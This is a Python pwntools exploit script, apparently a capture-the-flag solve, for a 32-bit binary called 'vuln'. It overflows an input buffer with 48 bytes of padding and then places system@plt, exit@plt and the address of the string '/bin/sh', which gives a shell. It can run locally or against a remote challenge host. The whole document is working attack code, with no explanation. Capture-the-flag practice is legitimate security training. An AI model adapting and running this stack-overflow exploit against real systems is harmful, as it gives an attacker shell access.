#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("chall.0xfun.org", 6927)

    return r


def main():
    r = conn()
    system = exe.plt["system"]
    exit  = exe.plt["exit"]
    binsh  = next(exe.search(b"/bin/sh"))
    log.info(f"system@plt : {hex(system)}")
    log.info(f"exit@plt   : {hex(exit)}")
    log.info(f"/bin/sh    : {hex(binsh)}")

    payload  = b"A" * 48
    payload += p32(system)
    payload += p32(exit)
    payload += p32(binsh)
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"chars):", payload)

    r.interactive()


if __name__ == "__main__":
    main()
